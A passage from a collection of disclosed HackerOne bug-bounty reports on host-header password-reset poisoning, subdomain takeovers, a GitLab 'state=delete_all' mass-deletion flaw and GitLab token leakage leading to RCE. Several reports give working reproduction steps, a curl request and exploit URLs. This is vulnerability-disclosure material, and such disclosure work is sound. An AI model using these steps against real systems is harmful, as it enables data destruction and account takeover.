    --data-binary $'ccm_token=1494113992%3A02eb0471b7b6e3a498ba7e6b57573b04&uEmail=hacker1337%40mailinator.com&resetPassword=' \
    $'http://<TARGET>/index.php/login/callback/concrete/forgot_password'
```

## Patch
Use `$_SERVER['SERVER_NAME']` rather than `$_SERVER['HTTP_HOST']`

## References
 http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html 

Thanks!
-Corben [(@sxcurity)](https://twitter.com/sxcurity)

ps: crayons

---

### [Возможность взлома любого пользователя, не использующего двухфакторной аутентификации, через получения кода восстановления на чужой номер.](https://hackerone.com/reports/219171)

- **Report ID:** `219171`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** VK.com
- **Reporter:** @norver
- **Bounty:** - usd
- **Disclosed:** 2017-05-20T17:14:48.037Z
- **CVE(s):** -

**Summary (team):**

Уязвимость в библиотеке приложения VK на Android, позволяющая получить на свой номер код для восстановления некоторых страниц.

**Summary (researcher):**

Из-за уязвимости можно было отправить код восстановления любой страницы на чужой номер, спасала только двухфакторная аутентификация.

---

### [Privilege escalation - Normal user can somehow make admin to delete shared folders](https://hackerone.com/reports/166581)

- **Report ID:** `166581`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Nextcloud
- **Reporter:** @egrep
- **Bounty:** - usd
- **Disclosed:** 2017-05-20T14:53:56.059Z
- **CVE(s):** -

**Summary (team):**

@etd reported an issue to us which had already been reported to us an independent party [via our public bug tracker](https://github.com/nextcloud/server/issues/1256). Thus we were not able to qualify this for a monetary reward.

However, we'd like to thank @etd for their report! – On request of the reporter, this issue is only disclosed limitedly. While we usually don't agree to disclose limited in this case the report was submitted prior to our policy change about disclosure.

The original report can be found below.

-------

**Details:**
Normal user can somehow make admin to delete shared folders

**Scenario:**
Created two users:
Admin user - "admin"
Normal user - "test" 


Steps:
1) Login as admin and create folder "sample_folder" in home and share with user "test" with settings: 
 --> can share

2) Login as test and goto home and once again share folder "sample_folder" with admin
3) If suppose admin visits Files --> Shared with you . There he can find shared folder "sample_folder". If he unshares the folder , then the folder "sample_folder" will be deleted completely without his knowledge

---

### [Subdomain takeover in many subdomains](https://hackerone.com/reports/205949)

- **Report ID:** `205949`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** OWOX, Inc.
- **Reporter:** @haxormad
- **Bounty:** - usd
- **Disclosed:** 2017-03-24T11:01:25.763Z
- **CVE(s):** -

**Summary (team):**

Subdomain takeover was possible in some of the subdomains. Though you cant claim it and host your page but it compromises them of using certain google services like GMAIL,Calendar,G-Drive,etc on those susbdomains.

**Summary (researcher):**

Subdomain takeover was possible in some of the subdomains. Though you cant claim it and host your page but it compromises them of using certain google services like GMAIL,Calendar,G-Drive,etc on those susbdomains.

---

### [Privilege Escalation on a DoD Website](https://hackerone.com/reports/199644)

- **Report ID:** `199644`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** U.S. Dept Of Defense
- **Reporter:** @vag_mour
- **Bounty:** - usd
- **Disclosed:** 2017-02-15T21:38:55.814Z
- **CVE(s):** -

**Summary (team):**

A Department of Defense website was exposed to a privilege escalation vulnerability, which could have allowed remote administrator access to the website. Thanks to @vag_mour for discovering this vulnerability!

---

### [Subdomain Takeover at http://gameday.websummit.net](https://hackerone.com/reports/193056)

- **Report ID:** `193056`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** WebSummit
- **Reporter:** @filedeletor1
- **Bounty:** - usd
- **Disclosed:** 2017-01-30T12:54:53.006Z
- **CVE(s):** -

**Vulnerability Information:**

As i said in the title i found a subdomain takeover vulnerability on the url http://gameday.websummit.net
The url was trying to find a bucket that didn't exist from a probably forgotten dns entry that was at
gameday.websummit.net.s3-website-eu-west-1.amazonaws.com

So i created a bucket with the specified name and uploaded a poc.
POC in the pictures

For more infos please ask...

---

### [Subdomain takeover on happymondays.starbucks.com due to non-used AWS S3 DNS record](https://hackerone.com/reports/186766)

- **Report ID:** `186766`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Starbucks
- **Reporter:** @dpgribkov
- **Bounty:** - usd
- **Disclosed:** 2016-12-19T22:59:42.194Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,

I discovered that happymondays.starbucks.com DNS CNAME record is pointing to S3 AWS bucket which doesn't exist. Here's the screenshot of vulnerable domain: {F138556}

As happymondays.starbucks.com was free to register on AWS S3 service and DNS-setup is already correct set-up: {F138557} 
I was able to claim the domain for PoC using the following set-up:  {F138558}
Also I have placed a two files located under root directory for validation: {F138559}
For mitigation you should immediately remove the DNS-entry for this domain. 

As you might consider, the impact of this are pretty significant. I now can publish whatever I want on this domain, even fetching httpOnly cookies. I would also be able to register SSL certificate for this domain through Let's Encrypt (it is only need meta/file verification to issue the certificate) That would end up with the ability to read secure cookies as well.

In addition, there's no way at all for a visitor of this page to validate that the content on this domain is not served by Starbucks, making it extremely easy to utilize this for targeting the organization by fake login forms / spear phishing using your own domain to plant the attack.

Cheers,
Danil

---

### [State filter in IssuableFinder allows attacker to delete all issues and merge requests](https://hackerone.com/reports/186194)

- **Report ID:** `186194`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** GitLab
- **Reporter:** @jobert
- **Bounty:** - usd
- **Disclosed:** 2016-12-06T00:57:18.114Z
- **CVE(s):** CVE-2016-9469

**Vulnerability Information:**

# Vulnerability details
The state filter in the `IssuableFinder` class has the ability to filter issues and merge requests by state. This filter is implemented by calling `public_send` with unfiltered user input. This allows an attacker to call `delete_all` or `destroy_all`. Because the method is called **before** the project / group scope is applied, it deletes all issues and merge requests of the GitLab instance.

# Proof of concept
Create two users and a new project for each of them. It doesn't matter if they're private or not. Now create an issue (or merge request) for each project. Now browse to the Issues overview. When clicking All, you'll be redirected to http://gitlab-instance/root/xxxx/issues?scope=all&state=all. Simply substitude `all` with `delete_all` in the URL and ALL issues will be deleted: http://gitlab-instance/root/xxxx/issues?scope=all&state=delete_all. To delete all merge requests, substitude `issues` with `merge_requests`. When requesting the `delete_all` URL, a 500 internal server error will be shown. This is caused by the `delete_all` method returning a boolean instead of an `ActiveRecord::Relation` class. Do **NOT** call this on the GitLab production site.

# Origin
The vulnerability comes from the fact that unsanitized user input is passed into a `public_send` call that is being called on `model.all`. Here's the `execute` method of the `IssuableFinder`:

```ruby
def execute
  items = init_collection
  items = by_scope(items)
  items = by_state(items)
  items = by_group(items)
  items = by_project(items)
  items = by_search(items)
  items = by_milestone(items)
  items = by_assignee(items)
  items = by_author(items)
  items = by_label(items)
  items = by_due_date(items)
  sort(items)
end
```

Now take a look at the `by_state` method:

```ruby
def by_state(items)
  params[:state] ||= 'all'

  if items.respond_to?(params[:state])
    items.public_send(params[:state])
  else
    items
  end
end
```

The controllers are passing the `state` parameter without any form of sanitization or validation to the finder. Since you're passing around ActiveRecord relations, `delete_all` can be called early on in the relation chain. Since the scope hasn't been applied (the `by_project` is called later), this will affect all issues and merge requests.

# Remediation
Never pass unsanitized or unvalidated user input to `public_send` or `send`.

**Summary (researcher):**

Multiple versions of GitLab expose a dangerous method to any authenticated user that could lead to the deletion of all `Issue` and `MergeRequest` objects on a GitLab instance. For GitLab instances with publicly available projects this vulnerability could be exploited by an unauthenticated user. A fix was included in versions 8.14.3, 8.13.8, and 8.12.11, which were released on December 5th 2016 at 3:59 PST. The GitLab versions vulnerable to this are 8.13.0, 8.13.0-ee, 8.13.1, 8.13.1-ee, 8.13.2, 8.13.2-ee, 8.13.3, 8.13.3-ee, 8.13.4, 8.13.4-ee, 8.13.5, 8.13.5-ee, 8.13.6, 8.13.6-ee, 8.13.7, 8.14.0, 8.14.0-ee, 8.14.1, 8.14.2, and 8.14.2-ee.

More information can be found at https://about.gitlab.com/2016/12/05/cve-2016-9469/.

---

### [Ability to access all user authentication tokens, leads to RCE](https://hackerone.com/reports/158330)

- **Report ID:** `158330`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** GitLab
- **Reporter:** @jobert
- **Bounty:** - usd
- **Disclosed:** 2016-11-03T22:28:43.639Z
- **CVE(s):** -

**Vulnerability Information:**

# Vulnerability details
The project export feature serializes the user objects of team members and stores it in the `project.json` file. This object contains the `authentication_token` for every user, meaning that an attacker can simply go ahead and create a project on GitLab.com, add one of the admins of GitLab.com, create an export, and obtain the authentication token for that user.

# Proof of concept
Follow these steps to reproduce the issue:

 - create a test account on a GitLab instance and create a temporary repository
 - invite an admin of the GitLab instance as a team member to the repository
 - go to the repository settings and create an export
 - wait a few minutes until you received the export email
 - now go to http://gitlab-instance/account/repo/download_export
 - unzip the downloaded file and examine `projects.json` - the `project_members` will contain the user object that contains the `authentication_token`

Here's the first few bytes of `rspeicher` (sorry Robert) his authentication token on GitLab.com: `ZyhqJr4XJZ...`. Someone could get access to GitLab's admin panel by extracting the token of an admin and go to https://gitlab.com/admin/users?authentication_token=<token>. From what I've seen on my own GitLab instance, this leads to RCE and gives me access to all code in private repositories. Let me know if you need more information!

---
